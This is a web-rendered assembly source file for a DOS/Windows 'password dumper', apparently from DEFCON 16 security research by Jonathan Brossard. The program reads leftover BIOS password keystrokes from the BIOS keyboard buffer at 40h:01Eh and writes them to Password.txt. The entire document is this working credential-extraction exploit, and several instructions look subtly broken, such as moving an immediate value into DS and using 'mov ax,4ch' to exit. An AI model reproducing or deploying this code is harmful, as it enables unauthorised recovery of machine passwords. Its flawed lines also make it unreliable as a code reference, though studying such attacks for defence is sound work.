...
<title>Bios Password Physical Memory Reader exploits (DEFCON 16)</title>
<link rel="canonical" href="https://moabi.com/research/jbrossard/whitepapers/tools/BIOS/wbios.asm" />
...
<body class="f9 b9">
<pre>
<span class="f7">;---------------- [ wbiosw.asm ]-----------------------------------------</span>


<span class="f7">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span>
<span class="f7">;  Endrazine - Jonathan Brossard - jb@endrazine.com  ;</span>
<span class="f7">;        Bios Password Physical Memory Reader        ;</span>
<span class="f7">;      Write to file Windows Compatible version      ;</span>
<span class="f7">;                                                    ;</span>
<span class="f7">;Compiling : A86 wbiosw.asm wbiosw.com               ;</span>
<span class="f7">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span>

<span class="f2">code</span> <span class="f5">seg</span><span class="f1">ment</span>
        <span class="f4">org</span> <span class="f4">100h</span>
        <span class="f4">assume</span> <span class="f6">ds</span>:<span class="f1">code</span>, <span class="f6">es</span>:<span class="f1">code</span>, <span class="f6">cs</span>:<span class="f1">code</span>

start:
        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">09h</span>
        <span class="f2">mov</span> <span class="f6">dx</span>,<span class="f1">offset</span> <span class="f1">welcome</span>
        <span class="f2">int</span> <span class="f4">21h</span>

        <span class="f2">xor</span> <span class="f6">ax</span>,<span class="f6">ax</span>
        <span class="f2">int</span> <span class="f4">16h</span>

        <span class="f2">mov</span> <span class="f6">ds</span>, <span class="f4">40h</span>                  <span class="f7">; This is the input buffer adress</span>
        <span class="f2">mov</span> <span class="f6">si</span>, <span class="f4">01EH</span>                 <span class="f7">; starting at 40h:01eh</span>
        <span class="f2">mov</span> <span class="f6">di</span>,<span class="f1">offset</span> <span class="f1">buffer</span>
        <span class="f2">mov</span> <span class="f6">cx</span>,<span class="f4">32</span>

daloop:
        <span class="f2">mov</span> <span class="f6">ax</span>,[<span class="f6">ds</span>:<span class="f6">si</span>]
        <span class="f2">mov</span> [<span class="f6">cs</span>:<span class="f6">di</span>],<span class="f6">ax</span>
        <span class="f2">inc</span> <span class="f6">di</span>
        <span class="f2">add</span> <span class="f6">si</span>,<span class="f4">2</span>                    <span class="f7">; Replace this line by add si,4</span>
                                    <span class="f7">; if you plan to use it under Dos</span>
<span class="f2">loop</span> <span class="f1">daloop</span>

        <span class="f2">mov</span> <span class="f6">ds</span>,<span class="f6">es</span>

        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">3ch</span>                 <span class="f7">; MS DOS Create file Function</span>
        <span class="f2">mov</span> <span class="f6">dx</span>, <span class="f1">offset</span> <span class="f1">fname</span>
        <span class="f2">xor</span> <span class="f6">cx</span>,<span class="f6">cx</span>
        <span class="f2">int</span> <span class="f4">21h</span>


        <span class="f2">mov</span> <span class="f6">ax</span>, <span class="f4">3d01h</span>               <span class="f7">; MS DOS Open file Function</span>
        <span class="f2">int</span> <span class="f4">21h</span>
        <span class="f2">mov</span> <span class="f1">handle</span>,<span class="f6">ax</span>

        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">40h</span>
        <span class="f2">mov</span> <span class="f6">bx</span>,<span class="f1">handle</span>
        <span class="f2">mov</span> <span class="f6">cx</span>,<span class="f4">32</span>
        <span class="f2">mov</span> <span class="f6">dx</span>, <span class="f1">offset</span> <span class="f1">Msg</span>
        <span class="f2">int</span> <span class="f4">21h</span>                     <span class="f7">; Write buffer to file</span>


        <span class="f2">mov</span> <span class="f6">ax</span>,<span class="f4">4ch</span>                  <span class="f7">; Quit</span>
        <span class="f2">int</span> <span class="f4">21h</span>




<span class="f1">handle</span><span class="f4"> dw</span> <span class="f1">?</span>
<span class="f1">welcome</span><span class="f4"> db</span> <span class="f3">'Password dumper by Endrazine (jb@endrazine.com)'</span>,<span class="f4">10</span>,<span class="f4">13</span>
        <span class="f4">db</span> <span class="f3">''</span>,<span class="f4">10</span>,<span class="f4">13</span>
        <span class="f4">db</span> <span class="f3">'Dumping Password to Password.txt'</span>,<span class="f4">10</span>,<span class="f4">13</span>
        <span class="f4">db</span> <span class="f3">'Press any Key$'</span>,<span class="f4">10</span>,<span class="f4">13</span>
<span class="f1">fname</span><span class="f4"> db</span> <span class="f3">'Password.txt'</span>,<span class="f4">0</span>
<span class="f1">Msg</span><span class="f4"> db</span> <span class="f3">'Password is : '</span>,<span class="f4">0</span>
<span class="f1">buffer</span><span class="f4"> db</span> <span class="f4">32</span> <span class="f1">dup</span> <span class="f1">?</span>
<span class="f4">end</span> <span class="f1">start</span>

<span class="f4">end</span>
</pre>
</body>
</html>
